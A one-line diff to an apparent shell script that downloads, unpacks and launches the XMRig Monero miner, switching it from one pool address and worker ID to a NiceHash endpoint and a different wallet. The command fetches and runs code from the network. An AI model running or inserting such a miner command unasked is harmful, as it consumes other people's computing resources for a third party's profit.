@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz && tar xf xmrig-6.16.0-linux-x64.tar.gz && cd xmrig-6.16.0 && ./xmrig --donate-level 5 --no-cpu --opencl --cuda -o 168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.blade33 -k --nicehash --coin monero -a cn/gpu
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz && tar -xf xmrig-6.16.2-linux-x64.tar.gz && cd xmrig-6.16.2 && ./xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u 31kM8w1qWx1g2v8aRBx2bNUkE4m3hpcjQo.blade222 -p x
